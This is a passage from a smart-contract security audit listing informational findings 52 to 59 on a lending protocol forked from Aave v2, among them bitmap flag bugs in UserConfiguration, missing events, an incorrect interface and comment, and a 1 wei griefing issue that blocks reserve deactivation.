52. UserConfiguration.isEmpty() is always false for whitelisted or blacklisted users Severity: Informational Difficulty: n/a Type: n/a Target: n/a Description: UserConfiguration.isEmpty() checks if UserConfiguration Map is empty with: return self.data == 0; The first 2 bits of self.data are for blacklisting and whitelisting, so if a user is whitelisted or blacklisted, isEmpty() will return false even if he has no assets. This does not impact GenericLogic.calculateUserAccountData() where isEmpty() is used, since userConfig.isUsingAsCollateralOrBorrowing(vars.i) will always be false and vars.totalCollateralInETH will be 0. The value returned will be (0, 0, 0, 0, type(uint256).max, 0) despite the issue. 
53. Events not emitted for important state changes Severity: Informational Difficulty: n/a Type: n/a Target: n/a Description: When changing state variables, events are not emitted. Emitting events allows off-chain monitoring. setPermissionlessTranches() and addWhitelisterAddress() don't emit events. 
54. Unused inherited Ownable contract Severity: Informational Difficulty: n/a Type: n/a Target: n/a Description: 
55. Incorrect interface used Severity: Informational Difficulty: n/a Type: n/a Target: n/a Description: Instead of using IERC20 interface in _deposit() function while checking the users asset balance IATOKEN interface is used DepositWithdrawLogic.sol vars.amount = IAToken(vars.asset).balanceOf(msg.sender); 
56. Natspec about the distribution of interest between depositors, pool owners, and Vmex in DefaultReserveInterestRateStrategy.sol is incorrect Severity: Informational Difficulty: n/a Type: n/a Target: n/a Description: The comment states that the interest given to the pool admin treasury is equal to borrow interest rate * reserve factor * (1 - VMEX Reserve Factor). However, the pool admin treasury receives borrow interest rate * reserve factor as seen in the _mintToTreasury function. 
57. Dos due to _checkNoLiquidity() Severity: Informational Difficulty: n/a Type: n/a Target: n/a Description: _checkNoLiquidity() checks if available liquidity is equal to zero. An attacker can send 1 wei of asset to the aToken address, which would cause a revert. This would make it impossible for the global admin to deactivate the reserve and tranche admin to set collateralEnabled to false. function _checkNoLiquidity(address asset, uint64 trancheId) internal view { DataTypes.ReserveData memory reserveData = pool.getReserveData( asset, trancheId ); uint256 availableLiquidity = IERC20Detailed(asset).balanceOf( reserveData.aTokenAddress ); require( availableLiquidity == 0 && reserveData.currentLiquidityRate == 0, Errors.LPC_RESERVE_LIQUIDITY_NOT_0 ); } 
58. Blacklisted users are considered by the system to have active borrows Severity: Informational Difficulty: n/a Type: n/a Target: n/a Description: As a part of the changes to the AAVE v2 protocol, VMEX added whitelist/blacklist functionality. A user's inclusion in these lists is determined by the most significants bits in their UserConfiguration.data bitmap. Consider the most significant bits below, as well the way that isBorrowingAny() is performed: UserConfiguration.data whitelisted user 0b10000000000000000000000... blacklisted user 0b01000000000000000000000... BORROWING_MASK 0b01010101010101010101010... function isBorrowingAny(...) internal pure returns (bool): return self.data & BORROWING_MASK != 0; This will return true for a blacklisted user. Most of the other functions in UserConfiguration account for the added whitelist/blacklist most significant bits, but isBorrowingAny() does not. There is little impact to the system however, as isBorrowingAny() is only called at the beginning of GenericLogic.balanceDecreaseAllowed() to short circuit and return early to save gas. There is no risk from this that a user is borrowing and isBorrowingAny() returns they are not, just a false positive (i.e. they are blacklisted + not borrowing). This will then then be caught by either the !userConfig.isUsingAsCollateral(...) check, which will return accurately for the specific collateral, or the later check for if (vars.totalDebtInETH == 0) {return true;}. function balanceDecreaseAllowed(...) external returns (bool) { if ( !userConfig.isBorrowingAny() || !userConfig.isUsingAsCollateral( reservesData[params.asset][params.trancheId].id ) ) { return true; } ... (...,vars.totalDebtInETH,,...,,...) = calculateUserAccountData(...); if (vars.totalDebtInETH == 0) { return true; } 
59. getFlags() and getFlagsMemory() will revert when asset is not active/allowed Severity: Informational Difficulty: n/a Type: n/a Target: n/a Description: ReserveConfiguration.getFlags() is called to retrieve if a reserve is active, frozen and borrowable. However, if the asset is not active then it will revert because of a check in AssetMapping.getAssetBorrowable(): require(assetMappings[asset].isAllowed, Errors.AM_ASSET_NOT_ALLOWED); 
